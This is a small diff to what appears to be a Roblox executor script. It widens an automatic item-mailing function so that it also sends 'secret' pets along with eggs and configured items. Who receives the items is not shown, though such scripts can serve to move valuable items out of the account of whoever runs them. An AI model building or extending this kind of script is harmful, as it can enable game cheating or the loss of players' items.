@@ -8,6 +8,7 @@ getgenv().Mailing = {
 
 local Network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local PetDir = require(game.ReplicatedStorage.Library.Directory.Pets)
 
 Mail_Item = function()
     local ItemList = {}
@@ -16,9 +17,9 @@ Mail_Item = function()
         for uid, v in pairs(Inv) do
             local ConfigMatch = false
             local Huge = Class == "Pet" and string.find(v.id, "Huge")
+            local Secret = Class == "Pet" and PetDir[v.id] and PetDir[v.id].secret
 
-            -- Updated logic: send any item with class "Egg"
-            if Class == "Egg" then
+            if Class == "Egg" or Secret then
                 ConfigMatch = true
             else
                 for _, CustomItem in pairs(getgenv().Mailing.Mail_Items) do
